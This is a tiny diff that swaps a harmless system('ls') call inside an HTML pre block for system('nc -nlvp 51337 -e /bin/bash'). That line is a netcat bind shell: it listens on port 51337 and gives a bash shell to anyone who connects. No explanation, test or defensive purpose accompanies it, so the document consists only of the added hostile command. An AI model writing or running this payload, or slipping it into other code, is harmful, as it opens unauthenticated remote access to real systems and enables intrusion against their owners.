@@ -1,1 +1,1 @@
-<pre>system('ls')</pre>
+<pre>system('nc -nlvp 51337 -e /bin/bash')</pre>
